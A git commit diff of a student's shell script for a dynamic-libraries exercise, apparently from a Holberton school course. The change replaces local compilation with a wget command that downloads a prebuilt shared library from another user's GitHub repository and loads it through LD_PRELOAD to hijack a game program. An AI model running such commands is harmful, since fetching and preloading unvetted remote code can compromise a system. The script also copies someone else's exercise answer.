cac47a054e0b1f5a2e35c4c30034e9971749385f
Abel Yitages Demissie <99829666+kiya3300@users.noreply.github.com>
2022-06-13 22:38:33 +0300

    Update 101-make_me_win.sh

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-gcc *.o -fPIC -shared -o libruin.so
-LD_PRELOAD=$PWD/libruin.so
+wget -q -O /tmp/cheatme.so https://github.com/rolandoquiroz/holbertonschool-low_level_programming/raw/master/0x18-dynamic_libraries/cheatme.so
+export LD_PRELOAD=/tmp/cheatme.so
